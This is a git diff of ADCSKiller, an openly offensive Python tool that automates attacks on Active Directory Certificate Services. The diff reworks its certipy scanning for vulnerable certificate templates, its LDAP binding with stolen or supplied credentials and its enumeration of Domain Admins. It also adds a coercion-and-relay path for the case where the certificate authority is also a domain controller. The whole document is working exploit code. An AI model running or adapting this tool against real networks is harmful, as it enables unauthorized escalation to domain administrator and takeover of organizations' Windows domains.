@@ -33,7 +33,7 @@ SOFTWARE.
 
 __author__ = "grimlockx"
 __license__ = "MIT"
-__version__ = "0.2.2"
+__version__ = "0.3"
 
 
 import argparse
@@ -78,110 +78,152 @@ class Coercer(threading.Thread):
         print(f'[+] Finished coercion from {self.target_dc} to {self.lhost}')
         
 class Exploit:
-    def __init__(self, domain, username, password, target, level, lhost) -> None:
+    def __init__(self, domain, username, password, target, lhost) -> None:
         self.__domain = domain
         self.__domain_parts = domain.split(".")
         self.__domain_cn = ''.join([f'dc={e},' for e in self.__domain_parts[:-1]]) + f'dc={self.__domain_parts[-1]}'
         self.__username = username
         self.__password = password
         self.__target = target
-        self.__level = level
         self.__lhost = lhost
         self.__domain_admins = []
-        self.__dc_synced = False
         self.__vulnerable_certificate_templates = {}
         self.__vulns = []
         self.__dc = []
 
     def get_certipy_results(self) -> bool:
-        # Create a output filename prefix
         current_datetime = datetime.now()
         self.__certipy_output_prefix = current_datetime.strftime("%Y%m%d%H%M%S")
 
-        # Try to get ceritpy results using the fully quallified domain name
         print("[*] Trying to find vulnerable certificate templates")
-        certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", f"{self.__certipy_output_prefix}"], capture_output=True, text=True).stdout
-
-        if "Got error: socket connection error while opening: timed out" in certipy_results: 
-            print(f'[-] Connection to the domain controller timed out')
-            return False
-
-        # If authentication against LDAP did not work, try to use every single domain part
-        if re.search(rf'Invalid credentials', certipy_results):
-            if int(self.__level) == 3:
-                for d in self.__domain_parts[:-1]:
-                    certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{d}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", f"{self.__certipy_output_prefix}"], capture_output=True, text=True).stdout
-                    if not re.search(rf'Invalid credentials', certipy_results):
-                        print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')          
-                        return True
-                    
-                return False
-            return False
-        
-        print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')          
-        return True
-    
-    def bind_to_ldap(self) -> None:
-        # Connect & bind to LDAP
-        print(f'[*] Trying to bind to ldap://{self.__target}:389')
-        l_server = ldap3.Server(f'ldap://{self.__target}:389', get_info=ldap3.ALL)
         try:
-            self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
-            print(f'[+] Bind to ldap://{self.__target}:389 successful\n')
-        except ldap3.core.exceptions.LDAPSocketOpenError:
-            print(f'[-] Binding to ldap://{self.__target}:389 failed\n')
-            print(f'[*] Trying to bind to ldaps://{self.__target}:636')
-            l_server = ldap3.Server(f'ldaps://{self.__target}:636', get_info=ldap3.ALL)
-            try:
-                self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
-                print(f'[+] Bind to ldaps://{self.__target}:636 successful\n')
-            except ldap3.core.exceptions.LDAPSocketOpenError:
-                print(f'[-] Binding to ldaps://{self.__target}:636 failed\n')
-                return False
-            except ldap3.core.exceptions.LDAPBindError:
-                print(f'[-] Binding to ldaps://{self.__target}:636 failed, invalid credentials\n')
-                return False
-        except ldap3.core.exceptions.LDAPBindError:
-            print(f'[-] Binding to ldap://{self.__target}:389 failed, invalid credentials\n')
-            return False
-        except ldap3.core.exceptions.LDAPSocketOpenError:
-            print(f'[-] Binding to ldap://{self.__target}:389 failed, connection timed out\n')
-            return False
+            certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", self.__certipy_output_prefix], capture_output=True, text=True).stdout
 
-    
-    def get_domain_admins(self) -> list:
-        print(f"[*] Getting Domain SID")
-        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(objectClass=domain)', attributes = ['objectSID'])
-        self.__domain_SID = self.__ldap_bind.response[0]['attributes']['objectSid']
-        print(f"[+] Received Domain SID: {self.__domain_SID}")
-
-        print(f"[*] Getting Domain Administrators Group Common Name of {self.__domain} using objectSID: {self.__domain_SID}-512")
-        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=group)(objectSid={self.__domain_SID}-512))', attributes = ['sAMAccountName'])
-        self.__domain_admins_cn =  self.__ldap_bind.response[0]['raw_attributes']['sAMAccountName'][0].decode("utf-8")
-
-        print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name: {self.__domain_admins_cn}")
-        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=group)(cn={self.__domain_admins_cn}))', attributes = ['member'])
-        for entry in self.__ldap_bind.response[0]['raw_attributes']['member']:
-            parsed_entry = entry.decode('utf-8').split(',')
-            self.__domain_admins.append(parsed_entry[0][3:])
-
-        # Fallback LDAP search if searching via sid did not return any results
-        if not self.__domain_admins:
-            print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name Domain Admins")
-            self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(memberOf=cn=Domain Admins,OU=Groups,{self.__domain_cn})', attributes = ['sAMAccountName'])
-            for entry in self.__ldap_bind.response:
+            if "Got error: socket connection error while opening: timed out" in certipy_results: 
+                print(f'[-] Connection to the domain controller timed out')
+                print(f'[*] Retrying to find vulnerable certificate templates by using a timeout of 100 seconds')
                 try:
-                    self.__domain_admins.append(entry['raw_attributes']['sAMAccountName'][0].decode("utf-8"))
-                # Filter does probably not only return domain admins
-                except KeyError:
-                    continue
+                    certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", self.__certipy_output_prefix, "-timeout", "100"], capture_output=True, text=True).stdout
+                    if "Got error: socket connection error while opening: timed out" in certipy_results: 
+                        print(f'[-] Connection to the domain controller timed out')
+                    if "Invalid credentials" in certipy_results:
+                        print(f'[-] Invalid credentials')
+                        return False
+                    
+                    print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')
+                    return True
+                
+                except subprocess.CalledProcessError as e:
+                    print(f'[-] Certipy command execution failed: {e.stderr}')
+                    return False
+
+            if "Invalid credentials" in certipy_results:
+                print(f'[-] Invalid credentials')
+                return False
+
+            print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')
+            return True
+
+        except subprocess.CalledProcessError as e:
+            print(f'[-] Certipy command execution failed: {e.stderr}')
+            return False
+    
+    def bind_to_ldap(self) -> bool:
+
+        servers = [
+            ldap3.Server(f'ldap://{self.__target}:389', get_info=ldap3.ALL),
+            ldap3.Server(f'ldaps://{self.__target}:636', get_info=ldap3.ALL)
+        ]
+
+        for server in servers:
+            protocol = 'ldap' if server.port == 389 else 'ldaps'
+            print(f'[*] Trying to bind to {protocol}://{self.__target}:{server.port}')
+            try:
+                self.__ldap_bind = ldap3.Connection(server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
+                print(f'[+] Bind to {protocol}://{self.__target}:{server.port} successful\n')
+                return True
+            except ldap3.core.exceptions.LDAPSocketOpenError:
+                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed\n')
+            except ldap3.core.exceptions.LDAPBindError:
+                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed, invalid credentials\n')
+                return False
+            except ldap3.core.exceptions.LDAPCertificateError:
+                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed, SSL/TLS certificate validation error\n')
+                return False
+            except ldap3.core.exceptions.LDAPSocketOpenError:
+                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed, connection timed out\n')
+                return False
+
+        return False
+
+    def get_domain_admins(self) -> list:
+        # Inner helper function the execute LDAP search queries
+        def execute_ldap_search(search_base, search_filter, attributes):
+            try:
+                self.__ldap_bind.search(search_base=search_base, search_filter=search_filter, attributes=attributes)
+                return self.__ldap_bind.response
+            except (ldap3.core.exceptions.LDAPSocketOpenError, ldap3.core.exceptions.LDAPNoSuchObjectResult, KeyError, IndexError):
+                return []
+
+        try:
+            print(f"[*] Getting Domain SID")
+            response = execute_ldap_search(f'{self.__domain_cn}', '(objectClass=domain)', ['objectSID'])
+            if not response:
+                print(f'[-] Error while getting Domain SID')
+                return []
+            self.__domain_SID = response[0]['attributes']['objectSid']
+            print(f"[+] Received Domain SID: {self.__domain_SID}")
+        except Exception as e:
+            print(f'[-] Error while getting Domain SID: {str(e)}')
+            return []
+
+        try:
+            print(f"[*] Getting Domain Administrators Group Common Name of {self.__domain} using objectSID: {self.__domain_SID}-512")
+            response = execute_ldap_search(f'{self.__domain_cn}', f'(&(objectCategory=group)(objectSid={self.__domain_SID}-512))', ['sAMAccountName'])
+            if not response:
+                print(f'[-] Error while getting Domain Administrators Group Common Name')
+                return []
+            self.__domain_admins_cn = response[0]['raw_attributes']['sAMAccountName'][0].decode("utf-8")
+        except Exception as e:
+            print(f'[-] Error while getting Domain Administrators Group Common Name: {str(e)}')
+            return []
+
+        try:
+            print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name: {self.__domain_admins_cn}")
+            response = execute_ldap_search(f'{self.__domain_cn}', f'(&(objectCategory=group)(cn={self.__domain_admins_cn}))', ['member'])
+            if not response:
+                print(f'[-] Error while getting Domain Administrators')
+                self.__domain_admins = []
+            else:
+                for entry in response[0]['raw_attributes']['member']:
+                    parsed_entry = entry.decode('utf-8').split(',')
+                    self.__domain_admins.append(parsed_entry[0][3:])
+        except Exception as e:
+            print(f'[-] Error while getting Domain Administrators: {str(e)}')
+            self.__domain_admins = []
+
+        # Fallback LDAP search query
+        if not self.__domain_admins:
+            try:
+                print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name Domain Admins")
+                response = execute_ldap_search(f'{self.__domain_cn}', f'(memberOf=cn=Domain Admins,OU=Groups,{self.__domain_cn})', ['sAMAccountName'])
+                if not response:
+                    print(f'[-] Error while getting Domain Administrators (fallback LDAP search)')
+                    self.__domain_admins = []
+                else:
+                    for entry in response:
+                        try:
+                            self.__domain_admins.append(entry['raw_attributes']['sAMAccountName'][0].decode("utf-8"))
+                        except KeyError:
+                            continue
+            except Exception as e:
+                print(f'[-] Error while getting Domain Administrators (fallback LDAP search): {str(e)}')
+                self.__domain_admins = []
 
         if self.__domain_admins:
             print(f'[+] Found Domain Administrators: {", ".join(self.__domain_admins)}\n')
-            return self.__domain_admins
-        
-        print(f'[-] Could not enumerate Domain Administrators\n')
-        return self.__domain_admins
+        else:
+            print(f'[-] Could not enumerate Domain Administrators\n')
 
     def fetch_certipy_results(self) -> dict:
         print(f"[+] Parsing certipy output {self.__certipy_output_prefix}_Certipy.json")
@@ -283,16 +325,23 @@ class Exploit:
             certipy_thread.join()
             
         elif self.__ca_dns in self.__dc and len(self.__dc) >= 2:
-            pass # TODO
+            print(f'[*] Certificate authority is also a domain controller')
+            certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.__ca_dns)
+            certipy_thread.start()
+            print('[*] Sleep for 5 seconds to wait for Certipy relay setup')
+            time.sleep(5)
+
+            target_dc = None
+            for dc in self.__dc:
+                if dc != self.__ca_dns:
+                    target_dc = dc
+                    break
             
-        
-
-# TODO        
-class DomainAdmin:
-    def __init__(self, cn):
-        self.cn = cn
-
-
+            coercer_thread = Coercer(2, "CoercerThread", self.__domain, self.__username, self.__password, target_dc, self.__lhost)
+            coercer_thread.start()
+            coercer_thread.join()
+            certipy_thread.join()
+            
 
 if __name__ == "__main__":
     print(
@@ -311,20 +360,19 @@ if __name__ == "__main__":
 
         """)
 
-    print("\nADCSKiller v0.2.2 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
+    print("\nADCSKiller v0.3 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
     parser = argparse.ArgumentParser()
     parser.add_argument('-d', '--domain', dest='domain',type=str, required=True, help='Target domain name. Use FQDN')
     parser.add_argument('-u', '--username', dest='username',type=str, required=True, help='Username')
     parser.add_argument('-p', '--password', dest='password',type=str, required=True, help='Password')
-    parser.add_argument('-t', '--target', dest='target',type=str, required=True, help='Target')
-    parser.add_argument('-l', '--level', dest='level',type=str, required=True, help='Level 1-3 determines aggressiveness')
-    parser.add_argument('-L', '--LHOST', dest='lhost',type=str, required=True, help='Local hostname - An ADIDNS entry might be required')
+    parser.add_argument('-dc-ip', '--target', dest='target',type=str, required=True, help='IP Address of the domain controller.')
+    parser.add_argument('-L', '--lhost', dest='lhost',type=str, required=True, help='FQDN of the listener machine - An ADIDNS is probably required')
     args = parser.parse_args()
 
-    exploit = Exploit(args.domain, args.username, args.password, args.target, args.level, args.lhost)
-    exploit.get_certipy_results()
-    exploit.bind_to_ldap()
-    exploit.get_domain_admins()
-    exploit.fetch_certipy_results()
-    exploit.get_dcs()
-    exploit.run_exploits()
+    exploit = Exploit(args.domain, args.username, args.password, args.target, args.lhost)
+    if exploit.get_certipy_results():
+        if exploit.bind_to_ldap():
+            exploit.get_domain_admins()
+            exploit.get_dcs()
+            exploit.fetch_certipy_results()
+            exploit.run_exploits()
